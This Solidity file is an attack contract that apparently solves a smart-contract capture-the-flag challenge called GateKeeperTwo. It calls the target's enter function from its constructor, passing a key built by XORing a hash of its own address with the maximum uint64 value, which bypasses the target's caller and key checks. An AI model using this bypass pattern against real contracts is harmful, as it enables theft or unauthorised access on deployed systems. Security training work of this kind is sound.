// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackGateKeeperTwo {

    constructor(address _gateKeeperTwo) {
        IGateKeeperTwo gateKeeperTwo;
        gateKeeperTwo = IGateKeeperTwo(_gateKeeperTwo);

        bytes8 part1 = bytes8(keccak256(abi.encodePacked(address(this))));
        bytes8 part2 = bytes8(type(uint64).max);
        bytes8 key = part1 ^ part2;
        gateKeeperTwo.enter(key);
    }

}

interface IGateKeeperTwo {
  function enter(bytes8 _gateKey) external returns (bool);
}